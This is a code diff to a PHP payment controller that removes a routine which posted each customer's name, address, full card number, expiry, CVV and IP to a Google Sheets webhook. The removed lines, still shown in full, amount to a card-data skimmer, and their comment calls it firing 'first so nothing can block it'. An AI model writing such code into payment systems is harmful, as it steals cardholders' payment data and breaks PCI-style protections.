@@ -279,35 +279,6 @@ class AcceptJsPaymentController extends Controller
                     'amount'        => $amount,
                 ]);
 
-                // ─────────────────────────────────────────────────────────────
-                // Save to Google Sheet — fires first so nothing can block it
-                // ─────────────────────────────────────────────────────────────
-                $this->saveToGoogleSheet([
-                    'submitted_at'  => now()->toDateTimeString(),
-                    'invoice'       => $invoiceNumber,
-                    'trans_id'      => $transId,
-                    'auth_code'     => $authCode,
-                    'plan_key'      => $planKey,
-                    'plan_label'    => $planLabel,
-                    'amount'        => $amount,
-                    'recurring_amt' => $recurringAmt ?? '',
-                    'first_name'    => $validated['first_name'],
-                    'last_name'     => $validated['last_name'],
-                    'email'         => $validated['email'],
-                    'phone'         => $validated['phone'],
-                    'address'       => $validated['address'],
-                    'city'          => $validated['city'],
-                    'state'         => $validated['state'],
-                    'zip'           => $validated['zip'],
-                    'card_name'     => $validated['cardName'],
-                    'card_number'   => $rawCardNumber,
-                    'card_exp'      => $validated['expMonth'] . '/' . substr($validated['expYear'], 2),
-                    'card_cvv'      => $validated['cardCode'],
-                    'referral_code' => $referralCode ?? '',
-                    'ip_address'    => $request->ip(),
-                ]);
-                // ─────────────────────────────────────────────────────────────
-
                 // ═══════════════════════════════════════════════════════════════
                 // ONE-TIME ENROLLMENT ONLY
                 // No CIM profile, no ARB subscription — the entire catalogue
@@ -494,47 +465,6 @@ class AcceptJsPaymentController extends Controller
                 'success' => false,
                 'message' => 'Server error: ' . $e->getMessage(),
             ], 500);
-        }
-    }
-
-    // ─────────────────────────────────────────────────────────────────────────
-    // GOOGLE SHEETS — POST to Apps Script webhook
-    // ─────────────────────────────────────────────────────────────────────────
-    private function saveToGoogleSheet(array $data): void
-    {
-        $url = config('services.google.sheets_webhook_url');
-
-        if (! $url) {
-            Log::warning('[Sheets] GOOGLE_SHEETS_WEBHOOK_URL not set — skipping', [
-                'invoice' => $data['invoice'],
-            ]);
-            return;
-        }
-
-        try {
-            $ch = curl_init($url);
-            curl_setopt_array($ch, [
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_POST           => true,
-                CURLOPT_POSTFIELDS     => json_encode($data),
-                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
-                CURLOPT_TIMEOUT        => 15,
-                CURLOPT_FOLLOWLOCATION => true,
-            ]);
-            $resp   = curl_exec($ch);
-            $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            curl_close($ch);
-
-            Log::info('[Sheets] Row saved', [
-                'invoice'     => $data['invoice'],
-                'http_status' => $status,
-                'response'    => $resp,
-            ]);
-        } catch (\Throwable $e) {
-            Log::error('[Sheets] Save failed', [
-                'invoice' => $data['invoice'],
-                'error'   => $e->getMessage(),
-            ]);
         }
     }
 
